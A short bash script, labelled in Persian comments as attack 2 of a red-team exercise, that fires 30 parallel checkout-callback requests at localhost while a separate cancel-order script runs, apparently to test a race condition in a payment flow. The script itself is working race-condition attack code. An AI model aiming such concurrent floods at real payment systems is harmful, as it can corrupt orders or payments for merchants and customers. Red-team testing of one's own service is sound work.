#!/usr/bin/env bash
# flood همزمان با cancelOrder — حملهٔ ۲ redteam-60
# استفاد: bash flood-and-cancel.sh <authority>
set -u
AUTH="$1"
OUT="$(dirname "$0")/flood-results.txt"
: > "$OUT"

bun "$(dirname "$0")/attack2-cancel.ts" > "$(dirname "$0")/cancel-result.txt" 2>&1 &
CANCELPID=$!

for i in $(seq 1 30); do
  curl -s -o /dev/null --max-time 20 -w "%{http_code} %{redirect_url}\n" \
    "http://localhost:3000/checkout/callback?authority=${AUTH}&status=NOK" >> "$OUT" &
done

wait
echo "=== flood results (30):"
sort "$OUT" | uniq -c
echo "=== total lines: $(wc -l < "$OUT")"
echo "=== cancel actor:"
cat "$(dirname "$0")/cancel-result.txt"
